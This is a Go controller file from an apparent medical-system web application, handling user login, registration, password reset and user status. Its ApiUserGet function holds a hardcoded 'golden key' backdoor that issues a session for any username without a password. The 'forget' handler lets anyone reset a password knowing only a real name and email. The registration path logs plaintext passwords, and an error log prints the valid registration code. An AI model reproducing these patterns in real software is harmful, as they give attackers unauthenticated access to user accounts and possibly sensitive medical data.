/*
 * Copyright (c) 2019-2020
 * Author: LIU Xiangyu
 * File: apiUser.go
 */

package controller

import (
	"encoding/json"
	"fmt"
	"gitee.com/uni-minds/medical-sys/database"
	"gitee.com/uni-minds/medical-sys/global"
	"gitee.com/uni-minds/medical-sys/manager"
	"gitee.com/uni-minds/medical-sys/module"
	"github.com/fatih/color"
	"github.com/gin-gonic/gin"
	"net/http"
	"strconv"
	"strings"
)

type UserLastStatus struct {
	LastPageIndex int `json:"lastPageIndex"`
	LastGroupId   int `json:"lastGroupId"`
}

type clientPushLogin struct {
	Username string `form:"username" json:"username"`
	Password string `form:"password" json:"password"`
	Remember bool   `json:"remember"`
}

type clientPushRegister struct {
	Username string `json:"username"`
	Password string `json:"password"`
	Email    string `json:"email"`
	Realname string `json:"realname"`
	Regcode  string `json:"regcode"`
}

type clientUserInformation struct {
	Realname string `json:"realname"`
	Email    string `json:"email"`
	Password string `json:""`
}

func UserGet(ctx *gin.Context) {
	uid := -1
	if value, exists := ctx.Get("uid"); !exists {
		return
	} else {
		uid = value.(int)
	}

	action := strings.ToLower(ctx.Query("action"))
	switch action {
	case "getlist":
		data := module.UserList()

		if data == "" {
			ctx.JSON(http.StatusOK, SuccessReturn("[]"))
			return
		} else {
			ctx.JSON(http.StatusOK, SuccessReturn(data))
		}

	case "getrealname":
		realname := module.UserGetRealname(uid)
		ctx.JSON(http.StatusOK, SuccessReturn(realname))

	case "laststatus":
		var status UserLastStatus
		status.LastGroupId, status.LastPageIndex = database.UserGetLastStatus(uid)
		jb, _ := json.Marshal(status)
		ctx.JSON(http.StatusOK, SuccessReturn(string(jb)))

	default:
		ctx.JSON(http.StatusOK, FailReturn(400, action))
	}
}

func ApiUserPost(ctx *gin.Context) {
	switch ctx.Param("op") {
	case "login":
		var u clientPushLogin

		if err := ctx.BindJSON(&u); err != nil {
			ctx.JSON(http.StatusOK, FailReturn(400, err.Error()))
			return
		}

		uid := module.UserCheckPassword(u.Username, u.Password)
		switch uid {
		case -1, -3:
			ctx.JSON(http.StatusOK, FailReturn(400, "用户名或密码不正确"))
		case -2, -5:
			ctx.JSON(http.StatusOK, FailReturn(400, "用户禁止登陆"))
		case -4:
			ctx.JSON(http.StatusOK, FailReturn(400, "账号过期"))
		default:
			if uid > 0 {
				token := manager.TokenNew(uid)
				maxAge := -1
				if u.Remember {
					maxAge = global.GetCookieMaxAge()
				}
				CookieWrite(ctx, "token", token, maxAge)
				CookieWrite(ctx, "uid", strconv.Itoa(uid), maxAge)
				ctx.JSON(http.StatusOK, SuccessReturn("/"))
			} else {
				log("i", "Invalid UID=", uid)
				ctx.JSON(http.StatusOK, FailReturn(400, "用户UID无效"))
			}
		}
		return

	case "forget":
		var info clientUserInformation
		if err := ctx.BindJSON(&info); err != nil {
			ctx.JSON(http.StatusOK, FailReturn(http.StatusForbidden, "Forbidden"))
			return
		}

		for uid, userInfo := range module.UserGetAll() {
			if userInfo.Realname == info.Realname && strings.ToLower(userInfo.Email) == strings.ToLower(info.Email) {
				if info.Password == "" {
					// 检索用户
					ctx.JSON(http.StatusOK, SuccessReturn(userInfo.Username))
				} else if err := module.UserSetPassword(uid, info.Password); err != nil {
					ctx.JSON(http.StatusOK, FailReturn(400, err.Error()))
				} else {
					log("w", "成功重置用户密码:", userInfo.Realname)
					ctx.JSON(http.StatusOK, SuccessReturn(userInfo.Username))
				}
				return
			}
		}
		ctx.JSON(http.StatusOK, FailReturn(http.StatusForbidden, "查无此人"))
		return

	case "register":
		var r clientPushRegister
		err := ctx.BindJSON(&r)
		if err != nil {
			ctx.JSON(http.StatusOK, FailReturn(400, Ereg01InvalidData))
			return
		}

		log("i", color.RedString("注册用户: %v", r))
		if r.Regcode != global.GetUserRegCode() {
			log("e", "Register code invalid:", r.Regcode, global.GetUserRegCode())
			ctx.JSON(http.StatusOK, FailReturn(400, Ereg02InvalidRegcode))
			return
		}

		uid := module.UserGetUid(r.Username)
		if uid != 0 {
			ctx.JSON(http.StatusOK, FailReturn(400, Ereg03UsernameExisted))
			return
		}

		err = module.UserCreate(r.Username, r.Password, r.Email, r.Realname, "REG")
		if err != nil {
			ctx.JSON(http.StatusOK, FailReturn(400, Ereg00CommonError))
		} else {
			module.UserSetActive(module.UserGetUid(r.Username))
			ctx.JSON(http.StatusOK, SuccessReturn("/"))
		}
	}
}

func ApiUserGet(ctx *gin.Context) {
	switch ctx.Param("op") {
	case "login":
		gkey := ctx.Query("goldenkey")
		if gkey == "Uni-Ledger-RIS" {
			username := ctx.Query("user")
			uid := module.UserGetUid(username)
			if uid != 0 {
				token := manager.TokenNew(uid)
				log("w", fmt.Sprint("------ GOLDEN KEY OVERRIDE / username: %s / uid: %d / token: %s / ------", username, uid, token))
				CookieWrite(ctx, "token", token, global.GetCookieMaxAge())
				CookieWrite(ctx, "uid", strconv.Itoa(uid), global.GetCookieMaxAge())
				ctx.Redirect(http.StatusFound, "/")
				return
			}
		}
	}
}
